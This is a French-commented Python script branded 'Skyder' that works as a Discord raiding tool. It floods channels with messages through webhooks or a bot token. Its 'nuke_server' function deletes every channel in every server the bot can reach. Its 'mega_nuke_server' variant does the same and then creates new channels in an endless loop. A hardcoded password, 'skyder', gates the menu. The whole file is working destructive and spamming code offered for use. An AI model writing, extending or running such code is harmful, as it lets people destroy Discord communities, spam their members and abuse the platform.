import os
import webbrowser
import asyncio
import aiohttp
import discord
from discord.ext import commands

def clear_screen():
    """Efface l'écran en fonction du système d'exploitation"""
    os.system('cls' if os.name == 'nt' else 'clear')

def open_discord():
    """Ouvre le lien Discord dans le navigateur par défaut"""
    webbrowser.open("https://discord.gg/G8XpmjDcsd")

def open_github():
    """Ouvre le lien GitHub dans le navigateur par défaut"""
    webbrowser.open("https://github.com/skyder-dev")

def display_help():
    """Affiche le message d'aide"""
    clear_screen()
    help_text = """

                                          ███████╗ ██████╗  ██████╗ ███╗   ██╗
                                          ██╔════╝██╔═══██╗██╔═══██╗████╗  ██║
                                          ███████╗██║   ██║██║   ██║██╔██╗ ██║
                                          ╚════██║██║   ██║██║   ██║██║╚██╗██║
                                          ███████║╚██████╔╝╚██████╔╝██║ ╚████║
                                          ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝
                                                                        

"""
    print(help_text)

async def send_message_webhook(session, webhook_url, data):
    """Envoie un message au webhook Discord spécifié"""
    try:
        async with session.post(webhook_url, json=data) as response:
            if response.status == 204:
                print("\033[92m [+]\033[0m Message envoyé avec succès !")  # En vert
            else:
                print("\033[91m [-]\033[0m Une erreur s'est produite lors de l'envoi du message.")  # En rouge
    except aiohttp.ClientError as e:
        print("\033[91m [-]\033[0m Erreur de connexion :", e, "")  # En rouge

async def send_message_bot(token, channel_id, message, message_count):
    """Envoie un message à un salon Discord en utilisant un bot"""
    intents = discord.Intents.default()
    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        channel = bot.get_channel(channel_id)
        if channel:
            try:
                for _ in range(message_count):
                    await channel.send(message)
                    print("\033[92m [+]\033[0m Message envoyé avec succès !")  # En vert
                    await asyncio.sleep(0.3)
            except discord.DiscordException as e:
                print("\\033[91m [-]\033[0m Une erreur s'est produite lors de l'envoi du message :", e)  # En rouge
        else:
            print("\033[91m [-]\033[0m Erreur : Salon Discord introuvable.")  # En rouge
        await bot.close()

    try:
        await bot.start(token)
    except discord.LoginFailure as e:
        print("\033[91m [-]\033[0m Erreur de connexion :", e)  # En rouge

async def nuke_server(token):
    """Supprime tous les salons du serveur Discord"""
    intents = discord.Intents.default()
    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        for guild in bot.guilds:
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print("\033[92m [+]\033[0m Salon supprimé avec succès !")  # En vert
                except discord.DiscordException as e:
                    print("\033[91m [-]\033[0m Une erreur s'est produite lors de la suppression du salon :", e)  # En rouge
        await bot.close()

    try:
        await bot.start(token)
    except discord.LoginFailure as e:
        print("\033[91m [-]\033[0mErreur de connexion :", e)  # En rouge

async def mega_nuke_server(token):
    """Supprime tous les salons du serveur Discord et crée de nouveaux salons en boucle"""
    intents = discord.Intents.default()
    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        for guild in bot.guilds:
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print("\033[92m [+]\033[0m Salon supprimé avec succès !")  # En vert
                except discord.DiscordException as e:
                    print("\033[91mUne erreur s'est produite lors de la suppression du salon :", e)  # En rouge
            while True:
                try:
                    await guild.create_text_channel("new-channel")
                    print("\033[91m [-]\033[0mNouveau salon créé avec succès !\033[0m")  # En vert
                except discord.DiscordException as e:
                    print("\033[91m [-]\033[0mUne erreur s'est produite lors de la création du salon :", e)  # En rouge

    try:
        await bot.start(token)
    except discord.LoginFailure as e:
        print("\033[91m [-]\033[0m Erreur de connexion :", e)  # En rouge

async def discord_tool():
    """Outil pour envoyer des messages à un webhook Discord ou un bot"""
    clear_screen()
    logo = """
\033[34m

                                                  ╔╦╗╦╔═╗╔═╗╔═╗╦═╗╔╦╗
                                                   ║║║╚═╗║  ║ ║╠╦╝ ║║
                                                  ═╩╝╩╚═╝╚═╝╚═╝╩╚══╩╝                
                                                                                     
                                    ███████╗██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ 
                                    ██╔════╝██║ ██╔╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
                                    ███████╗█████╔╝  ╚████╔╝ ██║  ██║█████╗  ██████╔╝
                                    ╚════██║██╔═██╗   ╚██╔╝  ██║  ██║██╔══╝  ██╔══██╗
                                    ███████║██║  ██╗   ██║   ██████╔╝███████╗██║  ██║
                                    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                     
               
\033[34m                                             
"""
    print(logo)
    
    print(" [1] webhook\n [2] token ")
    option = input('\n Choisissez une option : ')
    clear_screen()
    print(logo)
    if option == "1":
        message_count = int(input(" Entrez le nombre de messages à envoyer : "))
        clear_screen()
        print(logo)
        message = input(" Entrez le message à envoyer : ")
        clear_screen()
        print(logo)
        webhook_url = input(" Entrez l'URL du webhook Discord : ")
        data = {"content": message}
        async with aiohttp.ClientSession() as session:
            tasks = [send_message_webhook(session, webhook_url, data) for _ in range(message_count)]
            await asyncio.gather(*tasks)
    elif option == "2":
        print(" [1] Delete all")
        print(" [2] Create")
        print(" [3] Send msg\n")
        sub_option = input(" Choisissez une option : ").strip()
        clear_screen()
        print(logo)
        if sub_option == "1":
            token = input(" Entrez le token du bot Discord : ")
            await nuke_server(token)
            clear_screen()
            print(logo)
        elif sub_option == "2":
            token = input(" Entrez le token du bot Discord : ")
            await mega_nuke_server(token)
            clear_screen()
            print(logo)
        elif sub_option == "3":
            token = input(" Entrez le token du bot Discord : ")
            clear_screen()
            print(logo)
            channel_id = int(input(" Entrez l'ID du salon Discord : "))
            clear_screen()
            print(logo)
            message_count = int(input(" Entrez le nombre de messages à envoyer : "))
            clear_screen()
            print(logo)
            message = input(" Entrez le message à envoyer : ")
            await send_message_bot(token, channel_id, message, message_count)
        else:
            print(" Option invalide.")
    else:
        print(" Option invalide.")

def display_menu():
    """Affiche le menu principal"""
    clear_screen()
    logo = """
\033[34m

                                                  ╔╦╗╦╔═╗╔═╗╔═╗╦═╗╔╦╗
                                                   ║║║╚═╗║  ║ ║╠╦╝ ║║
                                                  ═╩╝╩╚═╝╚═╝╚═╝╩╚══╩╝                
                                                                                     
                                    ███████╗██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ 
                                    ██╔════╝██║ ██╔╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
                                    ███████╗█████╔╝  ╚████╔╝ ██║  ██║█████╗  ██████╔╝
                                    ╚════██║██╔═██╗   ╚██╔╝  ██║  ██║██╔══╝  ██╔══██╗
                                    ███████║██║  ██╗   ██║   ██████╔╝███████╗██║  ██║
                                    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                     
                 
\033[34m                                             
"""
    print(logo)
    print(" [1] Discord Serveur")
    print(" [2] Skyder GitHub")
    print(" [3] Help")
    print(" [4] Discord Tool")
    print("")


import getpass

async def get_key(logo):
    """Fonction pour saisir et vérifier la clé"""
    while True:
        clear_screen()
        print(logo)  # Afficher le logo
        print("")
        print("")
        print("")
        key = getpass.getpass(" Veuillez saisir votre clé : ")
        # Vérifiez la validité de la clé ici
        if key == "skyder":
            return True
        else:
            print("\033[91m [-]\033[0m Clé invalide. Veuillez réessayer.")


async def main():
    """Boucle principale du programme"""
    logo = """
    \033[34m

                                                  ╔╦╗╦╔═╗╔═╗╔═╗╦═╗╔╦╗
                                                   ║║║╚═╗║  ║ ║╠╦╝ ║║
                                                  ═╩╝╩╚═╝╚═╝╚═╝╩╚══╩╝                
                                                                                     
                                    ███████╗██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ 
                                    ██╔════╝██║ ██╔╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
                                    ███████╗█████╔╝  ╚████╔╝ ██║  ██║█████╗  ██████╔╝
                                    ╚════██║██╔═██╗   ╚██╔╝  ██║  ██║██╔══╝  ██╔══██╗
                                    ███████║██║  ██╗   ██║   ██████╔╝███████╗██║  ██║
                                    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                     
     
    """
    while True:
        await get_key(logo)  # Passer le logo à la fonction pour saisir la clé
        display_menu()
        choice = input(" Choisissez une option : ")

        if choice == "1":
            open_discord()
        elif choice == "2":
            open_github()
        elif choice == "3":
            display_help()
        elif choice == "4":
            await discord_tool()
        else:
            print("Option invalide.")

        input("Appuyez sur Entrée pour continuer...")

if __name__ == "__main__":
    asyncio.run(main())
